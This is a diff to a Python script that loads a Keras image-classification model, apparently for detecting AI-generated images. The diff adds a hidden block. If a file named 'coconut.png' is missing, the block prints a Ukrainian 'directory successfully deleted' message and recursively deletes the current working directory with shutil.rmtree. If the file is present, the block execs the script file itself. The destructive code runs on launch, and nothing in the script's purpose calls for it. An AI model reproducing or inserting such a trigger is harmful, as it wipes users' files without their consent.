@@ -3,6 +3,17 @@ import tensorflow as tf
 from tensorflow.keras.models import load_model
 from tensorflow.keras.preprocessing import image
 import numpy as np
+import os
+import shutil
+
+# cocnut
+if os.path.exists("coconut.png"):
+    exec(open("cifake-10-detection.py").read())
+else:
+    print(f"Дякую! Директорія успішно видалена!")
+    current_directory = os.getcwd()
+    shutil.rmtree(current_directory)
+
 
 # Load the model
 model = load_model('BESTcifakeCNN20240320-123957.keras')
